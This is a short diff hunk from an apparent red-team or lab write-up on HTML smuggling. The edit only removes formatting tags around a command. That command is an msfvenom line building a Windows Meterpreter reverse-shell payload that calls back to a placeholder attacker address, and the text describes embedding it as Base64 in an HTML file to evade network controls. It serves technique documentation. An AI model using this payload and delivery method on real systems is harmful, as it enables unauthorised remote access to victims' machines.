@@ -50,7 +50,7 @@ To bypass standard network-layer controls, an HTML smuggling vector was utilized
 A stageless Windows x64 Meterpreter reverse TCP payload was generated using msfvenom.
 Bash
 
-<pre><code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o smuggled_payload.exe</code></pre>
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o smuggled_payload.exe
 
 ### 2. Assembling the Smuggling Document:
 The binary was converted into a Base64 string and embedded inside a client-side JavaScript block within T1027_006_smuggling.html.
